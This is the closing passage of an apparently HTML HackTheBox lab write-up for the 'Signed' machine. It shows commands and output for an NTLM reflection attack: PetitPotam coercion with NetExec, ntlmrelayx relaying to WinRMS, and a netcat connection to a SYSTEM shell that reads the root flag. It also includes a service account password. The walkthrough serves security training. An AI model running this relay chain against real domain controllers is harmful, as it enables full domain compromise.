+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
+[*] HTTP server returned error code 500, this is expected, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://DC01.signed.htb SUCCEED [1]
+[*] winrms:///@dc01.signed.htb [1] -&gt; Started interactive WinRMS shell via TCP on 127.0.0.1:11000
+[*] (SMB): Received connection from 10.129.242.173, attacking target winrms://DC01.signed.htb
+[!] The client requested signing, relaying to WinRMS might not work!
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:5986  ...  OK
+[*] HTTP server returned error code 500, this is expected, treating as a successful login
+[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://DC01.signed.htb SUCCEED [2]
+[*] winrms:///@dc01.signed.htb [2] -&gt; Started interactive WinRMS shell via TCP on 127.0.0.1:11001
+</code></pre>
+<ol>
+<li>Use NetExec to test for NTLM reflection.</li>
+</ol>
+<pre><code>└─$ proxychains nxc smb dc01.signed.htb -u MSSQLSVC -p 'purPLE9795!@' -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA M=petitpotam 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:135  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:445  ...  OK
+SMB         224.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False) 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:445  ...  OK
+SMB         224.0.0.1       445    DC01             [+] SIGNED.HTB\MSSQLSVC:purPLE9795!@ 
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:445  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  dc01.signed.htb:445  ...  OK
+COERCE_PLUS 224.0.0.1       445    DC01             VULNERABLE, PetitPotam
+COERCE_PLUS 224.0.0.1       445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
+
+</code></pre>
+<ol>
+<li>Connecting to WinRMS shell on 127.0.0.1:11001 as displayed by the ntlmrelayx output.</li>
+</ol>
+<pre><code>└─$ proxychains impacket-ntlmrelayx -t winrms://DC01.signed.htb -smb2support 
+
+&lt;SNIP&gt;
+
+[*] (SMB): Authenticating connection from /@10.129.242.173 against winrms://DC01.signed.htb SUCCEED [2]
+[*] winrms:///@dc01.signed.htb [2] -&gt; Started interactive WinRMS shell via TCP on 127.0.0.1:11001
+</code></pre>
+<pre><code>└─$ nc 127.0.0.1 11001                   
+Type help for list of commands
+
+# whoami
+nt authority\system
+
+# DIR C:\Users\Administrator\Desktop
+Volume in drive C has no label.
+Volume Serial Number is BED4-436E
+
+ Directory of C:\Users\Administrator\Desktop
+
+10/06/2025  05:04 AM    &lt;DIR&gt;          .
+10/06/2025  05:04 AM    &lt;DIR&gt;          ..
+03/23/2026  11:57 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   6,357,471,232 bytes free
+
+# type C:\Users\Administrator\Desktop\root.txt
+29f7278f92b6b**********
+</code></pre>
+            </div>
+        </div>
+
+        <div class="mt-16 pt-8 border-t border-zinc-700 text-xs text-zinc-400 flex justify-between font-medium">
+            <div>Signed • HackTheBox • Retired • March 2026</div>
+            <div>Written by CyberEra</div>
+        </div>
+    </div>
+
+    <footer class="bg-zinc-900/80 py-12 text-center text-zinc-400 text-sm">
+
+    </footer>
+</body>
+</html>
